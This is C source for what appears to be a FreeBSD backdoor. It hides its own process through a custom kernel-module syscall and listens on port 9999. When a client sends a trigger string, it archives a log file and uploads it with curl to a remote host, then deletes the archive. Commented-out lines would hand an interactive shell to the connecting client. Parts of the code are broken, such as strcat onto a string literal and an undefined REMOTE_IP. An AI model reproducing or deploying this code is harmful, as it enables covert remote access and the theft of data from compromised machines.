#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/types.h>

int main (int argc, char **argv)
{
    int scktd = -1;
    int scktd_client = -1;
    int i = -1;
    struct sockaddr_in server;
    struct sockaddr_in client;

    // hide shell proc
    // getpid returns current proc pid
    // when execl is called, it uses the same pid
    // syscall 210 is the new syscall that loaded through kldmodule
    pid_t shellpid = getpid();
    syscall(210, shellpid);

    scktd = socket(AF_INET,SOCK_STREAM,0);
    if (scktd == -1)
        return -1;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(9999);

    if(bind(scktd,(struct sockaddr *)&server,sizeof(server)) < 0)
        return -2;

    listen(scktd,3);
    i = sizeof(struct sockaddr_in);
    scktd_client = accept(scktd,(struct sockaddr *)&client,(socklen_t*)&i);
    if (scktd_client < 0)
        return -3;

    char buff[8];
    read(scktd_client, buff, sizeof(buff));
    printf("%s\n", buff);
    if (strstr(buff, "6447") != NULL){
        system("tar -cjf /tmp/sendNudes /tmp/log_core-6dc9cf5e022a07ea8013a4b07a30a88270c65dfd5223ccc3964d9a7b4525008");
        char* command = "curl --form file=/tmp/sendNudes ";
        strcat(command, REMOTE_IP);
        system(command);
        system("rm /tmp/sendNudes");
    }

    //dup2(scktd_client,0); // STDIN
    //dup2(scktd_client,1); // STDOUT
    //dup2(scktd_client,2); // STDERR

    //execl("/bin/sh","sh","-i",NULL,NULL);

    return 0;
}

